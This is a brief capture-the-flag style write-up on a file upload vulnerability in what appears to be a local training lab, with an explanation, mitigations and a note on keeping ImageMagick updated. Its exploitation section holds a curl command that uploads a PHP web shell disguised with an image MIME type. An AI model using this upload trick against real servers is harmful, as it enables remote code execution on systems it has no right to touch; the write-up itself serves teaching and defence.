# File Upload

## 📖 Vulnerability Explanation
A file upload vulnerability occurs when a server doesn't validate an uploaded file properly.

## ⚙️ Exploitation Process

```
curl -s -X POST "http://localhost:9090/?page=upload" -F "uploaded=@shell.php;filename=shell.php;type=image/jpeg" -F "Upload=Upload" | grep flag
```

## 🔧 Fix
Sanitization process:
- Check file magic bytes
- Allow only certain extensions
- Generate a filename on the server
- Store files in a non accessible folder

## ☝️🤓 Advanced explanation
It is also possible to use a file processing tool, such as ImageMagick. However, it is crutial to make sure the packages are up to date, as it is very common to see vulnerabilities associated with these tools.